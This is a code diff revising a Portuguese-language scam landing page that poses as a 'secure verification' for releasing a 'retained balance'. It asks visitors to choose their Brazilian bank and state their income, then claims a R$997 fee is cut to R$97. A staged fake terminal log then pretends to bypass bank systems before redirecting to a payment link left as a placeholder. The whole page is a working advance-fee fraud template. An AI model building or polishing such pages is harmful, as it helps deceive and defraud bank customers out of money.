@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verificação de Chave - Protocolo 892</title>
+    <title>Verificação Segura - Protocolo 892</title>
     
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <script>
     !function(f,b,e,v,n,t,s)
@@ -18,342 +18,437 @@
     s.parentNode.insertBefore(t,s)}(window, document,'script',
     'https://connect.facebook.net/en_US/fbevents.js');
     
-    // SEU PIXEL ID
+    // SEU PIXEL
     fbq('init', '1773918999950681'); 
     fbq('track', 'PageView');
     </script>
     <noscript><img height="1" width="1" style="display:none"
     src="https://www.facebook.com/tr?id=1773918999950681&ev=PageView&noscript=1"
     /></noscript>
+
     <style>
         :root {
-            --primary: #003366; 
-            --secondary: #008837; 
-            --accent: #28a745; 
-            --bg: #f8f9fa;
-            --text: #333;
+            --bg-color: #f0f2f5;
+            --card-color: #ffffff;
+            --primary: #004d40; /* Verde Escuro Institucional */
+            --accent: #00c853; /* Verde Luz */
+            --text-dark: #1f2937;
+            --text-gray: #6b7280;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; -webkit-tap-highlight-color: transparent; }
         
         body { 
-            background-color: var(--bg); 
-            color: var(--text);
+            background-color: var(--bg-color); 
+            color: var(--text-dark);
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
-            min-height: 100vh;
         }
 
+        /* HEADER ESTILO APP */
         header {
             background: #fff;
             padding: 15px 20px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            border-bottom: 3px solid var(--accent);
+            justify-content: center;
+            position: relative;
+            z-index: 10;
         }
         
-        .logo-area { display: flex; align-items: center; gap: 10px; }
-        .shield-icon { color: var(--primary); font-size: 24px; }
-        .logo-text { font-size: 14px; font-weight: 700; color: var(--primary); text-transform: uppercase; line-height: 1.2; }
-        .secure-badge { background: #e8f5e9; color: var(--accent); padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; display: flex; align-items: center; gap: 5px; }
+        .header-content {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            text-transform: uppercase;
+        }
 
+        .lock-icon { color: #00c853; font-size: 16px; }
+
+        /* PROGRESSO */
+        .progress-bar {
+            height: 4px;
+            background: #e5e7eb;
+            width: 100%;
+        }
+        .progress-fill {
+            height: 100%;
+            background: #00c853;
+            width: 0%;
+            transition: width 0.6s ease;
+        }
+
+        /* CONTAINER PRINCIPAL */
         main {
             flex: 1;
+            padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            padding: 20px;
-            width: 100%;
-            max-width: 500px;
+            max-width: 480px;
             margin: 0 auto;
+            width: 100%;
         }
 
-        .progress-container { width: 100%; margin-bottom: 30px; }
-        .progress-label { display: flex; justify-content: space-between; font-size: 12px; color: #666; margin-bottom: 5px; font-weight: 500; }
-        .progress-track { background: #e9ecef; height: 8px; border-radius: 4px; overflow: hidden; }
-        .progress-fill { background: var(--secondary); height: 100%; width: 20%; transition: width 0.5s ease; }
-
+        /* CARD */
         .card {
-            background: #fff;
-            padding: 30px 25px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            background: var(--card-color);
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            padding: 25px 20px;
             width: 100%;
-            text-align: center;
-            display: none; 
-            animation: slideUp 0.4s ease-out;
+            display: none;
+            animation: fadeIn 0.4s ease-out;
         }
         .card.active { display: block; }
 
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(20px); }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
-        h1 { font-size: 20px; font-weight: 700; color: var(--primary); margin-bottom: 15px; }
-        p.desc { font-size: 15px; color: #555; margin-bottom: 25px; line-height: 1.5; }
-
-        .btn-group { display: flex; flex-direction: column; gap: 12px; }
+        /* TIPOGRAFIA */
+        h1 {
+            font-size: 22px;
+            font-weight: 800;
+            color: #111;
+            margin-bottom: 10px;
+            line-height: 1.2;
+        }
         
-        .btn {
+        p.desc {
+            font-size: 15px;
+            color: #555;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        /* BOTÕES DE BANCO (PREMIUM) */
+        .bank-grid {
+            display: grid;
+            gap: 12px;
+        }
+
+        .bank-btn {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px;
+            border-radius: 12px;
+            border: 1px solid #e5e7eb;
             background: #fff;
-            border: 2px solid #e0e0e0;
-            padding: 18px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            color: #444;
             cursor: pointer;
             transition: all 0.2s;
+            text-align: left;
             position: relative;
             overflow: hidden;
+        }
+
+        .bank-btn:active { transform: scale(0.98); background: #f9fafb; }
+
+        .bank-info { display: flex; align-items: center; gap: 15px; }
+        
+        /* Ícones dos Bancos */
+        .bank-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: #fff;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        /* Cores das Marcas */
+        .icon-nubank { background: #820ad1; }
+        .icon-bb { background: #003399; color: #ffe600; } /* Azul fundo, Amarelo ícone */
+        .icon-caixa { background: #0056b3; }
+        .icon-bradesco { background: #cc0000; }
+        .icon-itau { background: #ff6200; }
+        .icon-outro { background: #333; }
+
+        .bank-name {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1f2937;
+        }
+
+        .arrow-right { color: #ccc; font-size: 14px; }
+
+        /* BOTÕES NORMAIS (SIM/NÃO) */
+        .btn-action {
+            width: 100%;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            margin-bottom: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-        }
-
-        .btn:hover, .btn:active {
-            border-color: var(--secondary);
-            color: var(--secondary);
-            background: #f0f8ff;
+            transition: transform 0.1s;
         }
         
-        /* Estilo especial para botões de banco */
-        .btn-bank {
-            justify-content: flex-start;
-            padding-left: 20px;
-        }
-        
-        .btn.primary {
-            background: var(--secondary);
+        .btn-yes {
+            background: #00c853;
             color: white;
-            border: none;
-            box-shadow: 0 4px 10px rgba(0,136,55,0.3);
-            text-transform: uppercase;
+            box-shadow: 0 4px 15px rgba(0, 200, 83, 0.3);
         }
-        .btn.primary:hover { background: #006b2b; transform: translateY(-2px); }
+        
+        .btn-no {
+            background: #fff;
+            color: #555;
+            border: 2px solid #eee;
+        }
 
-        .loader-content { text-align: center; }
+        .btn-action:active { transform: scale(0.98); }
+
+        /* TERMINAL DE CARREGAMENTO */
+        .loader-container { text-align: center; padding-top: 10px; }
+        
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #e9ecef;
-            border-top: 5px solid var(--accent);
+            width: 60px;
+            height: 60px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #00c853;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto 20px auto;
         }
+
+        .terminal {
+            background: #1e1e1e;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: left;
+            font-size: 13px;
+            height: 160px;
+            overflow-y: hidden;
+            border-left: 4px solid #00c853;
+            margin-top: 20px;
+            box-shadow: inset 0 0 10px #000;
+        }
+
+        .log-line { margin-bottom: 6px; display: none; }
+        .log-success { color: #00ff00; font-weight: bold; }
+        .log-error { color: #ff4444; }
+        .log-process { color: #ffff00; }
+
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .terminal-log {
-            background: #2d2d2d;
-            padding: 15px;
-            border-radius: 6px;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            color: #00ff00;
-            text-align: left;
-            height: 130px;
-            overflow: hidden;
-            border-left: 3px solid var(--secondary);
-            margin-top: 15px;
-        }
-        .log-item { margin-bottom: 5px; display: none; }
-        .log-item.success { color: #00ff00; font-weight: bold; }
-        .log-item.warning { color: #ffeb3b; }
-        .log-item.error { color: #ff5252; }
-
+        /* RODAPÉ */
         footer {
+            margin-top: auto;
             text-align: center;
             padding: 20px;
-            font-size: 11px;
-            color: #aaa;
-            border-top: 1px solid #eee;
-            margin-top: auto;
-            background: #fff;
+            font-size: 12px;
+            color: #9ca3af;
         }
     </style>
 </head>
 <body>
 
     <header>
-        <div class="logo-area">
-            <i class="fas fa-key shield-icon"></i>
-            <div class="logo-text">Sistema de Ativação<br>Protocolo 892</div>
-        </div>
-        <div class="secure-badge">
-            <i class="fas fa-lock"></i> AMBIENTE CRIPTOGRAFADO
+        <div class="header-content">
+            <i class="fas fa-shield-alt lock-icon"></i>
+            <span>Ambiente Seguro</span>
         </div>
     </header>
+    
+    <div class="progress-bar">
+        <div class="progress-fill" id="progress"></div>
+    </div>
 
     <main>
-        
-        <div class="progress-container">
-            <div class="progress-label">
-                <span id="progress-text">Verificando Elegibilidade...</span>
-                <span id="percent-text">0%</span>
-            </div>
-            <div class="progress-track">
-                <div class="progress-fill" id="progress-bar"></div>
-            </div>
-        </div>
 
         <div id="step1" class="card active">
-            <div style="margin-bottom: 15px; color: var(--secondary); font-size: 40px;">
-                <i class="fas fa-university"></i>
-            </div>
-            <h1>Vínculo Bancário</h1>
-            <p class="desc">Para liberar a <strong>Chave de Ativação Específica</strong>, selecione onde você possui conta ativa ou saldo retido:</p>
-            
-            <div class="btn-group">
-                <button class="btn btn-bank" onclick="selectBank('NUBANK', 2)">
-                    <span style="color: #820ad1; font-weight: 900;">NUBANK</span>
-                </button>
-                <button class="btn btn-bank" onclick="selectBank('CAIXA ECONÔMICA', 2)">
-                    <span style="color: #0056b3; font-weight: 900;">CAIXA</span>
-                </button>
-                <button class="btn btn-bank" onclick="selectBank('BANCO DO BRASIL', 2)">
-                    <span style="color: #ffe600; text-shadow: 0px 0px 1px #333; font-weight: 900;">BANCO DO BRASIL</span>
-                </button>
-                <button class="btn btn-bank" onclick="selectBank('BRADESCO', 2)">
-                    <span style="color: #cc0000; font-weight: 900;">BRADESCO</span>
-                </button>
-                <button class="btn btn-bank" onclick="selectBank('ITAÚ', 2)">
-                    <span style="color: #ff6200; font-weight: 900;">ITAÚ</span>
-                </button>
-                <button class="btn btn-bank" onclick="selectBank('OUTRO BANCO', 2)">
-                    OUTRO BANCO / DIGITAL
-                </button>
+            <h1>Selecione sua instituição</h1>
+            <p class="desc">Para localizar o saldo retido, precisamos conectar ao sistema do seu banco.</p>
+
+            <div class="bank-grid">
+                
+                <div class="bank-btn" onclick="selectBank('Nubank', 2)">
+                    <div class="bank-info">
+                        <div class="bank-icon icon-nubank"><i class="fas fa-university"></i></div>
+                        <span class="bank-name">Nubank</span>
+                    </div>
+                    <i class="fas fa-chevron-right arrow-right"></i>
+                </div>
+
+                <div class="bank-btn" onclick="selectBank('Banco do Brasil', 2)">
+                    <div class="bank-info">
+                        <div class="bank-icon icon-bb" style="color: #ffe600;"><i class="fas fa-university"></i></div>
+                        <span class="bank-name">Banco do Brasil</span>
+                    </div>
+                    <i class="fas fa-chevron-right arrow-right"></i>
+                </div>
+
+                <div class="bank-btn" onclick="selectBank('Caixa Econômica', 2)">
+                    <div class="bank-info">
+                        <div class="bank-icon icon-caixa"><i class="fas fa-box"></i></div>
+                        <span class="bank-name">Caixa</span>
+                    </div>
+                    <i class="fas fa-chevron-right arrow-right"></i>
+                </div>
+
+                <div class="bank-btn" onclick="selectBank('Bradesco', 2)">
+                    <div class="bank-info">
+                        <div class="bank-icon icon-bradesco"><i class="fas fa-university"></i></div>
+                        <span class="bank-name">Bradesco</span>
+                    </div>
+                    <i class="fas fa-chevron-right arrow-right"></i>
+                </div>
+
+                <div class="bank-btn" onclick="selectBank('Itaú', 2)">
+                    <div class="bank-info">
+                        <div class="bank-icon icon-itau"><i class="fas fa-university"></i></div>
+                        <span class="bank-name">Itaú</span>
+                    </div>
+                    <i class="fas fa-chevron-right arrow-right"></i>
+                </div>
+
+                <div class="bank-btn" onclick="selectBank('Outro Banco', 2)">
+                    <div class="bank-info">
+                        <div class="bank-icon icon-outro"><i class="fas fa-university"></i></div>
+                        <span class="bank-name">Outro Banco</span>
+                    </div>
+                    <i class="fas fa-chevron-right arrow-right"></i>
+                </div>
+
             </div>
         </div>
 
         <div id="step2" class="card">
-            <div style="margin-bottom: 15px; color: #c4170c; font-size: 40px;">
-                <i class="fas fa-exclamation-triangle"></i>
-            </div>
-            <h1>Análise de Isenção</h1>
-            <p class="desc">O banco <strong id="bank-name-display">SELECIONADO</strong> cobra <strong>R$ 997,00</strong> pela Chave de Saque. Porém, clientes com renda superior a R$ 25.000 são isentos.</p>
-            <p class="desc" style="font-weight: 600;">A sua renda mensal é superior a R$ 25.000,00?</p>
-            
-            <div class="btn-group">
-                <button class="btn" onclick="nextStep(3)">
-                    SIM, GANHO MAIS DE 25K
-                </button>
-                <button class="btn" onclick="nextStep(3)" style="border-color: var(--secondary); font-weight: bold;">
-                    NÃO, GANHO MENOS (QUERO DESCONTO)
-                </button>
-            </div>
+            <h1>Verificação de Renda</h1>
+            <p class="desc">O sistema do <strong id="bank-label">BANCO</strong> isenta a taxa apenas para rendas altas.</p>
+            <p class="desc" style="background: #e9ecef; padding: 10px; border-radius: 8px;">
+                <i class="fas fa-search-dollar"></i> Sua renda mensal é superior a <strong>R$ 25.000,00</strong>?
+            </p>
+
+            <button class="btn-action btn-yes" onclick="nextStep(3)">
+                SIM, SOU RICO(A)
+            </button>
+            <button class="btn-action btn-no" onclick="nextStep(3)">
+                NÃO, GANHO MENOS
+            </button>
         </div>
 
         <div id="step3" class="card">
-            <div style="margin-bottom: 15px; color: var(--secondary); font-size: 40px;">
-                <i class="fas fa-unlock-alt"></i>
+            <div style="text-align: center; margin-bottom: 20px;">
+                <i class="fas fa-check-circle" style="font-size: 50px; color: #00c853;"></i>
             </div>
-            <h1>Chave Disponível</h1>
-            <p class="desc">Você não possui isenção automática do <span id="bank-name-final">BANCO</span>. Teria que pagar R$ 997,00.</p>
-            <p class="desc">Porém, através do sistema do ex-gerente, conseguimos gerar sua chave por <strong>R$ 97,00 (Preço de Custo)</strong>.</p>
-            <p class="desc" style="font-weight: bold; color: #000;">Deseja ativar sua chave agora?</p>
+            <h1>Chave Localizada!</h1>
+            <p class="desc">Conseguimos forçar a emissão da chave para sua conta do <strong id="bank-final">BANCO</strong>.</p>
             
-            <div class="btn-group">
-                <button class="btn primary" onclick="startLoading()">
-                    SIM, GERAR MINHA CHAVE AGORA
-                </button>
+            <div style="background: #fff3cd; color: #856404; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 14px;">
+                <strong>Status:</strong> Taxa de R$ 997,00 removida.<br>
+                <strong>Novo Valor:</strong> Apenas Taxa de Emissão (R$ 97).
             </div>
+
+            <button class="btn-action btn-yes" onclick="runProcess()">
+                ATIVAR CHAVE AGORA
+            </button>
         </div>
 
         <div id="loading" class="card">
-            <div class="loader-content">
+            <div class="loader-container">
                 <div class="spinner"></div>
-                <h2 style="color: var(--primary); font-size: 18px; margin-bottom: 10px;">Acessando Servidor...</h2>
-                <p style="font-size: 13px; color: #666;">Não feche, estamos burlando a taxa bancária.</p>
+                <h2>Acessando Sistema...</h2>
+                <p class="desc" style="font-size: 13px;">Não feche esta página.</p>
                 
-                <div class="terminal-log" id="terminal">
-                </div>
+                <div class="terminal" id="terminal"></div>
             </div>
         </div>
 
     </main>
 
     <footer>
-        <p>Copyright © 2026 - Todos os direitos reservados.</p>
-        <p style="margin-top: 5px;">Sistema Protegido | Conexão Segura</p>
+        <p>Copyright © 2026<br>Todos os direitos reservados.</p>
     </footer>
 
     <script>
-        const redirectUrl = "pgblack.html"; // SEU LINK
-        let selectedBank = "BANCO"; // Variável pra guardar o banco escolhido
+        // CONFIGURAÇÃO
+        const redirectLink = "pgblack.html"; // Coloque seu link aqui
+        let selectedBankName = "";
 
-        function updateProgress(percent) {
-            document.getElementById('progress-bar').style.width = percent + '%';
-            document.getElementById('percent-text').innerText = percent + '%';
+        function updateBar(percent) {
+            document.getElementById('progress').style.width = percent + '%';
         }
 
-        // Função especial pra salvar o banco
-        function selectBank(bankName, nextStepNum) {
-            selectedBank = bankName;
-            // Atualiza os textos dos próximos passos com o nome do banco
-            document.getElementById('bank-name-display').innerText = bankName;
-            document.getElementById('bank-name-final').innerText = bankName;
+        function selectBank(name, next) {
+            selectedBankName = name;
+            document.getElementById('bank-label').innerText = name;
+            document.getElementById('bank-final').innerText = name;
             
-            nextStep(nextStepNum);
+            // Feedback tátil se disponível
+            if (navigator.vibrate) navigator.vibrate(40);
+            
+            nextStep(next);
         }
 
         function nextStep(step) {
-            if (navigator.vibrate) navigator.vibrate(50);
-            document.querySelectorAll('.card').forEach(el => el.classList.remove('active'));
-            document.getElementById('step' + step).classList.add('active');
-            if(step === 2) updateProgress(50);
-            if(step === 3) updateProgress(85);
+            document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+            document.getElementById('step'+step).classList.add('active');
+            
+            if(step === 2) updateBar(50);
+            if(step === 3) updateBar(85);
         }
 
-        function startLoading() {
-            if (navigator.vibrate) navigator.vibrate(50);
+        function runProcess() {
+            if (navigator.vibrate) navigator.vibrate(40);
             document.getElementById('step3').classList.remove('active');
             document.getElementById('loading').classList.add('active');
-            updateProgress(90);
+            updateBar(95);
 
             const terminal = document.getElementById('terminal');
-            // LOGS PERSONALIZADOS COM O NOME DO BANCO
             const logs = [
-                { text: `> Conectando ao Servidor Seguro do ${selectedBank}...`, delay: 500 },
-                { text: "> Verificando status da conta...", delay: 1500 },
-                { text: "> ALERTA: Taxa Bancária de R$ 997 DETECTADA!", delay: 2500, type: 'error' },
-                { text: "> Aplicando Protocolo de Isenção (Vingança)...", delay: 3500, type: 'warning' },
-                { text: `> Removendo taxa do ${selectedBank}...`, delay: 4500 },
-                { text: "> CHAVE DE ATIVAÇÃO LIBERADA (R$ 97)!", delay: 5500, type: 'success' }
+                { text: `> Conectando ao servidor ${selectedBankName}...`, class: 'log-process', delay: 500 },
+                { text: `> Buscando CPF no banco de dados...`, class: '', delay: 1500 },
+                { text: `> ALERTA: Bloqueio de R$ 997,00 encontrado.`, class: 'log-error', delay: 2500 },
+                { text: `> Injetando script de isenção...`, class: 'log-process', delay: 3500 },
+                { text: `> SUCESSO! Chave gerada para ${selectedBankName}.`, class: 'log-success', delay: 4500 },
+                { text: `> Redirecionando para saque...`, class: '', delay: 5500 }
             ];
 
-            let logIndex = 0;
-
-            function addLog() {
-                if (logIndex < logs.length) {
-                    const log = logs[logIndex];
+            let index = 0;
+            function printLog() {
+                if (index < logs.length) {
+                    const log = logs[index];
                     setTimeout(() => {
-                        const p = document.createElement('div');
-                        p.className = 'log-item ' + (log.type || '');
-                        p.style.display = 'block';
-                        p.innerText = log.text;
-                        terminal.appendChild(p);
-                        terminal.scrollTop = terminal.scrollHeight;
+                        const div = document.createElement('div');
+                        div.className = `log-line ${log.class}`;
+                        div.style.display = 'block';
+                        div.innerText = log.text;
+                        terminal.appendChild(div);
+                        terminal.scrollTop = terminal.scrollHeight; // Auto scroll
                         
-                        if (logIndex === logs.length - 1) {
+                        if(index === logs.length - 1) {
                             setTimeout(() => {
-                                updateProgress(100);
-                                window.location.href = redirectUrl;
-                            }, 1500);
+                                window.location.href = redirectLink;
+                            }, 1000);
                         }
-                        
-                        logIndex++;
-                        addLog();
-                    }, logIndex === 0 ? log.delay : 1000); 
+
+                        index++;
+                        printLog();
+                    }, index === 0 ? log.delay : 800);
                 }
             }
-            addLog();
+            printLog();
         }
     </script>
+
 </body>
 </html>
